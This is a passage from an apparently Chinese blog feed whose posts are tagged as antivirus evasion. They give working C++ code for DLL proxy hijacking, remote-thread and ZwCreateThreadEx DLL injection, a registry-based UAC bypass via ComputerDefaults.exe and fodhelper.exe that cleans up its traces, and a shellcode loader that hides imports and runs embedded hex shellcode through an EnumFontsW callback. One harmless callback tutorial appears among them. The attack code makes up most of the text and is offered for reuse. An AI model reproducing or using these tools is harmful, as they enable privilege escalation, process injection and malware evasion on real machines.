	hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, GetCurrentProcessId());
	if (hProcess)
	{
		WriteProcessMemory(hProcess, addr1, data1, sizeof(data1), NULL);

		CloseHandle(hProcess);
	}

	return 0;
}


BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)
{
	if (dwReason == DLL_PROCESS_ATTACH)
	{
		DisableThreadLibraryCalls(hModule);

		if (Load() && Init())
		{
			TCHAR szAppName[MAX_PATH] = TEXT("livehime.exe");//请修改宿主进程名
			TCHAR szCurName[MAX_PATH];

			GetModuleFileName(NULL, szCurName, MAX_PATH);
			PathStripPath(szCurName);

			//是否判断宿主进程名
			if (StrCmpI(szCurName, szAppName) == 0)
			{
				//启动补丁线程或者其他操作
				HANDLE hThread = CreateThread(NULL, NULL, ThreadProc, NULL, NULL, NULL);
				system("calc.exe");
				if (hThread)
				{
					CloseHandle(hThread);
				}
			}
		}
	}
	else if (dwReason == DLL_PROCESS_DETACH)
	{
		Free();
	}

	return TRUE;
}


```

最后将原来的streaming-processor.dll改为streaming-processor1.dll，点击livehime.exe即可

![](https://s3.hedgedoc.org/demo/uploads/d8c1ea08-2010-4b82-962d-b27c1c4374a1.png)

触发计算器，且livehime.exe运行正常

如果是不用转发的这个办法，那么livehime.exe是无法正常运行的]]></content>
      <categories>
        <category>代码</category>
      </categories>
      <tags>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title>Dll注入</title>
    <url>/2024/03/26/Dll%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[# 简述

就是将dll给放入某一个进程的地址空间中，让它成为进程的一部分
其实就是常说的将dll注入到进程
但是这个也存在局限性，因为必须要在目标机器上留下我们的dll

# 注入思路
1. 获取目标进程pid
2. 通过pid获取目标进程句柄
3. 在进程中创建一个足够大的内存空间，用于存放dll路径
4. 将dll给写入空间中
5. 获取LoadLibraryW函数
6. 创建线程，用LoadLibraryW加载存放dll的内存空间
7. 清理资源

# 代码

```C++
#include <cstdio>
#include <cstring>
#include <Windows.h>
#include <tlhelp32.h>

// 获取进程的PID
DWORD GetProcessPID(LPCTSTR processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[-]创建进程快照失败\n");
        return 0;
    }

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &processEntry)) {
        while (_wcsicmp(processEntry.szExeFile, processName) != 0) {
            if (!Process32Next(hSnapshot, &processEntry)) {
                printf("[-]未发现%ls进程\n", processName);
                CloseHandle(hSnapshot);
                return 0;
            }
        }

        printf("%ls进程的PID为：%lu\n", processName, processEntry.th32ProcessID);
        CloseHandle(hSnapshot);
        return processEntry.th32ProcessID;
    }

    printf("[-]没有返回进程信息\n");
    CloseHandle(hSnapshot);
    return 0;
}

DWORD RemoteThreadInject(DWORD pid, LPCTSTR dllPath) {
    //1. 打开进程，获取句柄
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        printf("[-]打开进程失败 \n");
        return 0;
    }
    else {
        printf("[+]打开进程成功 \n");
    }

    //2. 远程申请内存
    DWORD sizeDllPath = (wcslen(dllPath) + 1) * sizeof(TCHAR);
    LPVOID mem = VirtualAllocEx(hProcess, NULL, sizeDllPath, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (mem == NULL) {
        printf("[-]远程申请内存失败 \n");
        return 0;
    }
    else {
        printf("[+]远程申请内存成功 \n");
    }

    //3. 将dllPath给写入内存
    BOOL writeMem = WriteProcessMemory(hProcess, mem, dllPath, sizeDllPath, NULL);
    if (!writeMem) {
        printf("[-]将dllPath写入内存失败 \n");
        return 0;
    }
    else {
        printf("[+]将dllPath写入内存成功 \n");
    }


    //4. 获取LoadLibrary函数
    FARPROC loadLibraryAddr = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");

    //5. 创建线程
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, mem, 0, NULL);
    if (hThread == NULL) {
        printf("[-]创建远程线程失败\n");
        return 0;
    }
    else {
        printf("[+]创建远程线程成功\n");
    }

    //6. 等待线程结束
    WaitForSingleObject(hThread, -1);

    // 7. 清理资源
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, mem, 0, MEM_RELEASE);
    CloseHandle(hProcess);
}

int main() {
    DWORD pid = GetProcessPID(L"notepad.exe");
    RemoteThreadInject(pid, L"D:\\study\\C++\\dll\\Dll5\\x64\\Release\\DLL5.dll");
}
```

效果：

![](https://s3.hedgedoc.org/demo/uploads/4f5dacc1-f209-4725-ba6d-185645827646.png)

]]></content>
      <categories>
        <category>代码</category>
      </categories>
      <tags>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title>session0 注入</title>
    <url>/2024/03/26/session0%20%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[# 简介
一般情况下将我们是没有办法将shellcode给直接注入到如lsass.exe的进程中的（user权限）
还有就是用户态的函数如CreateRemoteThread早就被杀软杀烂了，所以就考虑用内核态的函数

# 实现方法
主要还是利用api函数，不过这个api函数不是我们一般情况下用户态函数
这里用x64位下的CreateRemoteThread函数举例子

# 实现流程
## kernel32.dll

首先查看kernel32.dll中的CreateRemoteThread函数

![](https://s3.hedgedoc.org/demo/uploads/dd252100-a40a-4551-8b49-46f223f35f1c.png)

这里没有搜到，CreateRemoteThread
1. 但是找到一个比较像的函数CreateRemoteThreadStub
2. 接着调用了CreateRemoteThreadStub()
3. 最后调用了CreateRemoteThreadEx（__imp_CreateRemoteThreadEx）

从第3号标记可以看到，CreateRemoteThreadEx是红色的，这代表着此函数是从第三方dll中调用出来的

按一下回车键查看伪代码，可以看到CreateRemoteThreadEx有8个参数

![](https://s3.hedgedoc.org/demo/uploads/8590aa0f-be0c-48b8-a174-1dd28670ec7a.png)

我们导入表搜索CreateRemoteThreadEx

![](https://s3.hedgedoc.org/demo/uploads/d242bf2f-81a9-4d36-83a9-70c3190783e8.png)

这里的Library显示的是自己，不过要去kernelbase中搜索才知道（我也不知道为啥要去kernelbase.dll中）

## kernelbase.dll

kernelbase.dll中搜索CreateRemoteThreadEx，有搜到，不过并没有找到具体调用了哪一个函数

![](https://s3.hedgedoc.org/demo/uploads/f7b8739a-c643-491b-9233-cb9592a9039b.png)

在汇编中，按tab键看伪代码

![](https://s3.hedgedoc.org/demo/uploads/fec10d6d-6570-4c60-adb5-b9512c01e723.png)

发现了NtCreateThreadEx
这么多调用了的函数为什么就看NtCreateThreadEx？
因为NtCreateThreadEx和CreateRemoteThreadEx长得像
我们去导入表查看NtCreateThreadEx

![](https://s3.hedgedoc.org/demo/uploads/70f497f0-5b08-4eea-b748-82c870abcf07.png)

可以看到，NtCreateThreadEx在ntdll.dll中

## ntdll.dll

![](https://s3.hedgedoc.org/demo/uploads/b1f3da86-f0a6-4196-ba0a-560df69804f7.png)

最终调用NtCreateThreadEx，随后调用syscall进入内核层，随后调用ZwCreateThreadEx函数
你问NtCreateThreadEx和ZwCreateThreadEx的区别？
1. NtCreateThreadEx是用户态的函数
2. ZwCreateThreadEx是内核态的函数

ZwCreateThreadEx的权限比NtCreateThreadEx的大
就好比有一个事情需要公司里的其他人配合，你一个普通职员去安排这个事情，肯定没有老板去安排这个事情稳妥好办，因为没有其他员工不敢买老板的账

![](https://s3.hedgedoc.org/demo/uploads/5cadee8b-edc3-478c-a326-cfea34a05912.png)

ZwCreateThreadEx的原型

```C++
#ifdef _WIN64
typedef DWORD(WINAPI *typedef_ZwCreateThreadEx)(
	PHANDLE ThreadHandle,
	ACCESS_MASK DesiredAccess,
	LPVOID ObjectAttributes,
	HANDLE ProcessHandle,
	LPTHREAD_START_ROUTINE lpStartAddress,
	LPVOID lpParameter,
	ULONG CreateThreadFlags,
	SIZE_T ZeroBits,
	SIZE_T StackSize,
	SIZE_T MaximumStackSize,
	LPVOID pUnkown);
#else
typedef DWORD(WINAPI *typedef_ZwCreateThreadEx)(
	PHANDLE ThreadHandle,
	ACCESS_MASK DesiredAccess,
	LPVOID ObjectAttributes,
	HANDLE ProcessHandle,
	LPTHREAD_START_ROUTINE lpStartAddress,
	LPVOID lpParameter,
	BOOL CreateSuspended,
	DWORD dwStackSize,
	DWORD dw1,
	DWORD dw2,
	LPVOID pUnkown);
#endif

# 完整代码

```C++
#include <cstdio>
#include <cstring>
#include <Windows.h>
#include <tlhelp32.h>

#ifdef _WIN64
typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    LPVOID ObjectAttributes,
    HANDLE ProcessHandle,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    ULONG CreateThreadFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    LPVOID pUnkown);
#else
typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    LPVOID ObjectAttributes,
    HANDLE ProcessHandle,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    BOOL CreateSuspended,
    DWORD dwStackSize,
    DWORD dw1,
    DWORD dw2,
    LPVOID pUnkown);
#endif

//提权
BOOL EnableDebugPrivilege()
{
    HANDLE hToken;
    BOOL fOk = FALSE;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
    {
        TOKEN_PRIVILEGES tp;
        tp.PrivilegeCount = 1;
        LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        fOk = (GetLastError() == ERROR_SUCCESS);
        CloseHandle(hToken);
    }
    return fOk;
}

//获取进程的PID
DWORD GetProcessPID(LPCWSTR processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[-]创建进程快照失败\n");
        return 0;
    }

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &processEntry)) {
        while (_wcsicmp(processEntry.szExeFile, processName) != 0) {
            if (!Process32Next(hSnapshot, &processEntry)) {
                printf("[-]未发现%ls进程\n", processName);
                CloseHandle(hSnapshot);
                return 0;
            }
        }

        printf("%ls进程的PID为：%lu\n", processName, processEntry.th32ProcessID);
        CloseHandle(hSnapshot);
        return processEntry.th32ProcessID;
    }

    printf("[-]没有返回进程信息\n");
    CloseHandle(hSnapshot);
    return 0;
}

void ZwCreateThreadInject(DWORD pid, LPCWSTR dllPath) {
    //1. 打开进程，获取句柄
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess != NULL) {
        //2. 远程申请内存
        DWORD sizeDllPath = (wcslen(dllPath) + 1) * sizeof(TCHAR);
        LPVOID mem = VirtualAllocEx(hProcess, NULL, sizeDllPath, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (mem != NULL) {
            BOOL writeMem = WriteProcessMemory(hProcess, mem, dllPath, sizeDllPath, NULL);
            if (writeMem) {
                FARPROC loadLibraryAddr = GetProcAddress(LoadLibraryW(L"kernel32.dll"), "LoadLibraryW");
                if (loadLibraryAddr != NULL) {
                    HMODULE hNtdllDll = LoadLibraryA("ntdll.dll");
                    typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(hNtdllDll, "ZwCreateThreadEx");
                    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, mem, 0, NULL);
                    HANDLE hRemoteThread = NULL;
                    DWORD injectStatus = ZwCreateThreadEx(&hRemoteThread, PROCESS_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)loadLibraryAddr, mem, 0, 0, 0, 0, NULL);
                    if (hRemoteThread != NULL) {
                        printf("success\n");
                    }
                    FreeLibrary(hNtdllDll);
                }
            }
        }
        //7. 释放申请的内存
        VirtualFreeEx(hProcess, mem, sizeDllPath, MEM_COMMIT);
    }
    //8. 关闭进程句柄
    CloseHandle(hProcess);
}


int main() {
    DWORD pid = GetProcessPID(L"notepad.exe");
    ZwCreateThreadInject(pid, L"D:\\study\\C++\\dll\\Dll5\\x64\\Debug\\Dll5.dll");
}
```

# 学习
https://www.cnblogs.com/cunren/p/15267403.html
]]></content>
      <categories>
        <category>代码</category>
      </categories>
      <tags>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title>bypassUAC</title>
    <url>/2024/03/26/bypassUAC/</url>
    <content><![CDATA[# UAC
## 简介
UAC的主要目的是提高系统的安全性，防止未经授权的更改和恶意软件的滥用。
它通过弹出对话框来通知用户，当某个程序试图以管理员权限运行时，或者尝试对系统进行更改时。这样，用户可以确认是否允许这些操作，从而减少了恶意软件通过欺骗方式获得系统权限的可能性。

![](https://s3.hedgedoc.org/demo/uploads/4daeb51a-c7c2-4ced-829c-01e6e2960656.png)

# bypassUAC

## 简述
bypassUAC主要用于提权或者作为免杀的一环

## 利用条件
虽然UAC提高了系统的安全性，但有时候用户可能会感到烦扰，因为有些程序需要使用管理员权限而会导致频繁弹出权限提升提示。

所以windows给某些设置了自动提升权限（autoElevate），且不会弹出权限提升提示（静默启动），从而启动程序时，直接就是以高权限启动（这个可以看程序的manifest标识的配置属性autoElevate为true）

但是这还不能利用，我们需要在这两条件的前提下，在启动的时候可以调用其他命令,那么就需要介绍Shell\Open\Command了：
1. 注册表中的Shell\Open\Command是Windows操作系统中的一个注册表项，用于指定在打开文件时所执行的命令。这个注册表项通常用于关联文件类型和相应的应用程序。
2. 在Windows中，每个文件类型都会有一个关联的默认程序来打开它。例如，对于.txt文件，通常会关联到记事本应用程序。而这种关联是通过注册表中的相应项来实现的。
3. Shell\Open\Command注册表项包含了一个字符串值，即文件的执行命令。当用户双击一个文件时，操作系统会在这个注册表项中查找相应的命令，然后执行它来打开文件。

总的来说就3点：
1. 程序的manifest标识的配置属性autoElevate为true
2. 不会弹出uac窗口
3. 程序启动时候，调用了注册表中的Shell\Open\Command键值对

上面第1点可以用下面的bat脚本跑：
```
@echo off

set "search_dir=C:\Windows\System32"

echo begin......

for /r "%search_dir%" %%i in (*.exe) do (
    sigcheck64.exe -m "%%i" | findstr "autoElevate" > nul
    if not errorlevel 1 (
        echo %%i
    )
)

pause

```

![](https://s3.hedgedoc.org/demo/uploads/b6939411-35d6-4d3b-b384-283254171220.png)

## 例子

这里用微软的程序sigcheck64.exe进行查看 C:\Windows\System32\ComputerDefaults.exe
下载地址：https://learn.microsoft.com/en-us/sysinternals/downloads/sigcheck

1. 白名单程序（包含数字签名等...）且manifest标识的配置属性autoElevate为true

![](https://s3.hedgedoc.org/demo/uploads/8741f3c1-9495-49a4-8501-ffeee1f63d95.png)

2. 程序启动没有UAC弹窗（静默启动）
3. 用Procmon.exe监听ComputerDefaults.exe，并从注册表里查询 "Shell\Open\Command" 键值对

![](https://s3.hedgedoc.org/demo/uploads/f1055d56-d34b-4619-851d-80d40f8f6080.png)

4. 在注册表中找这个地址：HKCU\Software\Classes\ms-settings\Shell\Open\command（HKCU是HKEY_CURRENT_USER的首字母缩写）

![](https://s3.hedgedoc.org/demo/uploads/c153d6a7-ff68-4730-969b-66d2716f96eb.png)

可以看到HKCU\Software\Classes目录下没有ms-settings\Shell\Open\command这个项，没有就对了，咱们自己创建

![](https://s3.hedgedoc.org/demo/uploads/b2111ec5-6ffc-493e-b54c-4270de5189fd.png)

然后再在HKCU\Software\Classes\ms-settings\Shell\Open\command的默认项中加一个cmd.exe

![](https://s3.hedgedoc.org/demo/uploads/a562795b-ba37-417b-8123-dd9dce5e8d05.png)

最后运行C:\Windows\System32\ComputerDefaults.exe

![](https://s3.hedgedoc.org/demo/uploads/28b5fed5-90b6-4f6b-9b73-58d066ad5db5.png)

可以看到，并未弹出cmd.exe的窗口，我们再看下Procmon.exe的监听

![](https://s3.hedgedoc.org/demo/uploads/8aee3c43-6082-4667-9f69-fc813b4a45a4.png)

可以看到HKCU\Software\Classes\ms-settings\Shell\Open\command是加载成功了的
但是又多了一个HKCU\Software\Classes\ms-settings\Shell\Open\command\DelegateExecute且显示NAME NOT FOUND，那么咱们再给加一个DelegateExecute

![](https://s3.hedgedoc.org/demo/uploads/fa8f9bb1-bbcf-424d-84c0-cdb05bfa62ee.png)

最后再次运行C:\Windows\System32\ComputerDefaults.exe

![](https://s3.hedgedoc.org/demo/uploads/b307464f-71c1-432d-bef7-7eeb27aa42b6.png)

成功弹出cmd.exe，而且是管理员权限的

## 问题

Windows defener要杀

![](https://s3.hedgedoc.org/demo/uploads/72a6fa8d-f9e6-4751-aa9c-f07341c82393.png)

## 代码一键化
这里我们的代码，建立在找到了某一个exe程序可以bypassUAC的前提下，依然以C:\Windows\System32\ComputerDefaults.exe来举例子

### 代码逻辑
1. 创建（或打开）注册表中的子项，这里打开子项“HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\Shell\\Open\\command”
2. 写入注册表项的默认值，值为你要设定的程序
3. 写入注册表项的DelegateExecute值，值可以不设
4. 创建一个C:\Windows\System32\ComputerDefaults.exe的进程，用于启动ComputerDefaults.exe
5. 删除我们添加的Software\\Classes\\ms-settings\\Shell\\Open\\command，不留痕迹

具体代码如下：
```C++
#include <stdio.h>
#include <Windows.h>

int bypassuac(LPCSTR filePath) {
	if (filePath == NULL) {
		printf("please enter your file path!");
		return 0;
	}

	HKEY hKey;

	// 1、创建或打开注册表中的子项
	LONG result1 = RegCreateKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open\\command", &hKey);
	if (result1 != ERROR_SUCCESS) {
		printf("create key fail~");
		return 0;
	}
	else {
		printf("create key success\n");
	}

	// 2、写入注册表项的默认值
	LONG result2 = RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)filePath, strlen(filePath) + 1024);
	if (result2 != ERROR_SUCCESS) {
		printf("set key fail~\n");
		return 0;
	}
	else {
		printf("set key success\n");
	}

	// 3、写入注册表项的DelegateExecute值
	LONG result3 = RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (BYTE*)"", sizeof(""));
	if (result3 != ERROR_SUCCESS) {
		printf("set key DelegateExecute fail~\n");
		return 0;
	}
	else {
		printf("set key DelegateExecute success\n");
	}

	// 4、创建一个C:\Windows\System32\ComputerDefaults.exe的进程
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	BOOL success = CreateProcessA("C:\\Windows\\System32\\cmd.exe", (LPSTR)"/c C:\\Windows\\System32\\ComputerDefaults.exe", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	if (success) {
		printf("CreateProcess success！\n");
	}
	else {
		DWORD dwError = GetLastError();
		printf("CreateProcess fail, error_num：%d\n", dwError);
	}

	// 6、需要先睡眠1秒，让第4步先完成，再进行第5步；如果不睡眠，第5步会比第4步先执行
	Sleep(1000);

	// 5、删除我们添加的Software\\Classes\\ms-settings\\Shell\\Open\\command
	if (RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings") == ERROR_SUCCESS) {
		printf("delete success\n");
	}
	else {
		printf("delete fail\n");
	}


}

int main(int argc, char* argv[]) {

	if (argc != 2) {
		printf("lost paramater\neg: %s C:\\Windows\\System32\\cmd.exe\n", argv[0]);
	}
	else {
		bypassuac(argv[1]);
	}

	
}

```
效果：

![](https://s3.hedgedoc.org/demo/uploads/415e7b2d-582f-44ac-913f-26e8dd3b34ae.png)

## 已知测试的exe

### C:\Windows\System32\fodhelper.exe
```C++
#include <stdio.h>
#include <Windows.h>

int bypassuac(LPCSTR filePath) {
	if (filePath == NULL) {
		printf("please enter your file path!");
		return 0;
	}

	HKEY hKey;

	// 1、创建或打开注册表中的子项
	LONG result1 = RegCreateKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open\\command", &hKey);
	if (result1 != ERROR_SUCCESS) {
		printf("create key fail~");
		return 0;
	}
	else {
		printf("create key success\n");
	}

	// 2、写入注册表项的默认值
	LONG result2 = RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)filePath, strlen(filePath) + 1024);
	if (result2 != ERROR_SUCCESS) {
		printf("set key fail~\n");
		return 0;
	}
	else {
		printf("set key success\n");
	}


	// 3、写入注册表项的DelegateExecute值
	LONG result3 = RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (BYTE*)"", sizeof(""));
	if (result3 != ERROR_SUCCESS) {
		printf("set key DelegateExecute fail~\n");
		return 0;
	}
	else {
		printf("set key DelegateExecute success\n");
	}


	// 4、创建一个C:\Windows\System32\fodhelper.exe的进程
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	BOOL success = CreateProcessA("C:\\Windows\\System32\\cmd.exe", (LPSTR)"/c C:\\Windows\\System32\\fodhelper.exe", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	if (success) {
		printf("CreateProcess success！\n");
	}
	else {
		DWORD dwError = GetLastError();
		printf("CreateProcess fail, error_num：%d\n", dwError);
	}

	// 6、需要先睡眠1秒，让第4步先完成，再进行第5步；如果不睡眠，第5步会比第4步先执行
	Sleep(1000);


	// 5、删除我们添加的Software\\Classes\\ms-settings\\Shell\\Open\\command
	if (RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings") == ERROR_SUCCESS) {
		printf("delete success\n");
	}
	else {
		printf("delete fail\n");
	}


}

int main(int argc, char* argv[]) {

	if (argc != 2) {
		printf("lost paramater\neg: %s C:\\Windows\\System32\\cmd.exe\n", argv[0]);
	}
	else {
		bypassuac(argv[1]);
	}

	
}
```
### ...以此类推















]]></content>
      <categories>
        <category>代码</category>
      </categories>
      <tags>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title>回调函数</title>
    <url>/2024/03/26/%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[# 简介
主要特征，是将一个函数作为一个参数传递给另外一个函数

# 好处
允许在某个事件发生时调用它。通常，回调函数用于实现自定义行为，以便在特定事件发生时执行。

# 实现流程
1. 定义一个“回调函数类型”
2. 定义一个“回调函数”，“回调函数”需要与“回调函数类型”的参数和返回值是一个类型
3. “回调函数”被某个函数调用

# 代码实现
```C++
#include <cstdio>
#include <Windows.h>

//定义一个回调函数类型
typedef void (*CallbackFunction)(LPCSTR somthing);

//回调函数（经验）
void myCallBackFunction1(LPCSTR something) {
	printf("经验：%s\n",something);
}

//回调函数（金币）
void myCallBackFunction2(LPCSTR something) {
	printf("金币：%s\n", something);
}

//回调函数（经验）
void myCallBackFunction3(LPCSTR something) {
	printf("金币：%s\n", something);
}

//调用回调函数的  函数（击败敌人）
int gogogo(CallbackFunction fun, LPCSTR word) {
	fun(word);
	return 0;
}

int main(int argc, char* argv[]) {
	printf("战斗开始\n");
	Sleep(1000);
	printf("====================================================================\n");
	printf("战斗结束，你成功击败敌人，获取了：\n\n");
	gogogo(myCallBackFunction1, "+300\n");
	gogogo(myCallBackFunction2, "+50\n");
	gogogo(myCallBackFunction3, "破损的单手剑\n");

	return 0;
}
```

![](https://s3.hedgedoc.org/demo/uploads/3f505d5d-3f49-48cb-b2c1-c51b468191aa.png)
]]></content>
      <categories>
        <category>代码</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>隐藏导入表</title>
    <url>/2024/03/26/%E9%9A%90%E8%97%8F%E5%AF%BC%E5%85%A5%E8%A1%A8/</url>
    <content><![CDATA[# 一、GetProcAddress
```c++
#include <iostream>
#include <cstring>
#include <string>
#include <vector>
#include <Windows.h>

typedef LPVOID(WINAPI* MyVA)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
    );

typedef int (WINAPI* MyEF)(
    HDC           hdc,
    LPCWSTR       lpFaceName,
    FONTENUMPROCW lpFontEnumProc,
    LPARAM        lParam
    );

int main() {
    MyVA myva = (MyVA)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "VirtualAlloc");
    MyEF myef = (MyEF)GetProcAddress(GetModuleHandleW(L"gdi32.dll"), "EnumFontsW");

    char nox_shellcode[] = "fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c632e65786500";
    std::vector<char> shellcode;  // 初始化为全零，用于存储转义序列形式

    // 将每两个字符转换为对应的 ASCII 字符
    for (size_t i = 0; i < strlen(nox_shellcode); i += 2) {
        std::string hex = std::string(nox_shellcode + i, 2); //每次取两个字符，即1个16位进制数
        int num = std::stoi(hex, nullptr, 16); //将16位进制数转化为10进制整数
        char ch = static_cast<char>(num); //将10进制整数转化为对应的字符
        shellcode.push_back(ch); //将字符添加到mem数组中
    }

    LPVOID mem = myva(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(mem, shellcode.data(), shellcode.size());

    HDC hdc = GetDC(NULL);
    myef(hdc, NULL, (FONTENUMPROCW)mem, NULL);

    VirtualFree(mem, 0, MEM_RELEASE);

    return 0;
}

```
![](https://s3.hedgedoc.org/demo/uploads/d016c25e-f030-4d4d-adaa-c78b0a4185e6.png)

效果：

![](https://s3.hedgedoc.org/demo/uploads/794f0b42-b08b-4796-be60-06d9343988ab.png)

查看导入表：

![](https://s3.hedgedoc.org/demo/uploads/ebce4dd1-7ac4-44f6-ba25-86ea1c848b08.png)


没发现VirtualAlloc和EnumFontsW函数，但是存在GetProcAddress和GetModuleHandleW两个参数，也是危险的，只能说是半隐藏，能骗骗小白

![](https://s3.hedgedoc.org/demo/uploads/fb8bd2b3-55ba-4166-8fb3-d03b1abc2313.png)

# 二、汇编+C++隐藏

## 1、简述
一般写加载器，都会用到VirtualAlloc、CrteateThread、LoadLibrary等函数，这都被杀软标记为了马子特征
为了规避这个问题，只有在内存中找到函数地址然后再使用

## 2、寻找kernel.dll
下面用windbg进行调试
32位于64位环境下的PEB地址偏移有所不同，下面是32位环境记录，用kernel.dll举例子

每一个进程中至少有一个线程，每一个线程都有一个TEB结构，TEB的地址用fs:[0]来表示

1. 在0x030这个地址，有一个指针指向PEB结构，PEB是进程记录自身信息的一个结构
2. 在PEB的0x00c偏移有一个_PEB_LDR_DATA结构
3. 在_PEB_LDR_DATA的偏移0x014是InMemoryOrderModuleList，就是dll的加载链表（说人话就是InMemoryOrderModuleList保存了你加载了哪些dll）

那么我们就可以定位kernel.dll了，方法如下：
1. 定位PEB
2. 在PEB中找到_PE_LDR_DATA
3. 在_PE_LDR_DATA中找到InInitializationorderModuleList
4. 从InInitializationorderModuleList找到kernel.dll

这里是用的是32位的Proc.exe

### I、查看teb详细结构
```
dt -r1 _teb
```
![](https://s3.hedgedoc.org/demo/uploads/2a020b1e-aac8-468b-94b2-66eba4a2fdee.png)

可以看到，teb偏移0x030即为peb

### II、查看peb详细结构
```
dt -r1 _peb
```

![](https://s3.hedgedoc.org/demo/uploads/0eddb555-c857-4ca4-abb5-82a7e54744fd.png)

可以看到，peb偏移0x00c即为Ldr

#### A、peb原型
微软给出的peb原型：https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb

```C++
typedef struct _PEB {
  BYTE                          Reserved1[2];
  BYTE                          BeingDebugged;
  BYTE                          Reserved2[1];
  PVOID                         Reserved3[2];
  PPEB_LDR_DATA                 Ldr;
  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
  PVOID                         Reserved4[3];
  PVOID                         AtlThunkSListPtr;
  PVOID                         Reserved5;
  ULONG                         Reserved6;
  PVOID                         Reserved7;
  ULONG                         Reserved8;
  ULONG                         AtlThunkSListPtr32;
  PVOID                         Reserved9[45];
  BYTE                          Reserved10[96];
  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
  BYTE                          Reserved11[128];
  PVOID                         Reserved12[1];
  ULONG                         SessionId;
} PEB, *PPEB;

```

从原型中我们知道，Ldr其实是一个PEB_LDR_DATA类型

![](https://s3.hedgedoc.org/demo/uploads/bf24cf3c-fc83-4e29-a348-bb738b97c1fd.png)

### III、查找peb中Ldr具体位置
```
!peb
```

![](https://s3.hedgedoc.org/demo/uploads/e0646ae3-df15-40f4-bb09-08d8e7aab3f9.png)

可以看到，Ldr地址为77a7cb00

### IV、跟进Ldr分析

```
dt -r1 77a7cb00 _PEB_LDR_DATA
```

![](https://s3.hedgedoc.org/demo/uploads/3f0b8a78-d9eb-4cbf-9fb7-209745444ee5.png)

上面我们说到，ldr是一个PEB_LDR_DATA类型

#### A、PEB_LDR_DATA原型
微软给出的PEB_LDR_DATA原型：	https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data

```C++
typedef struct _PEB_LDR_DATA {
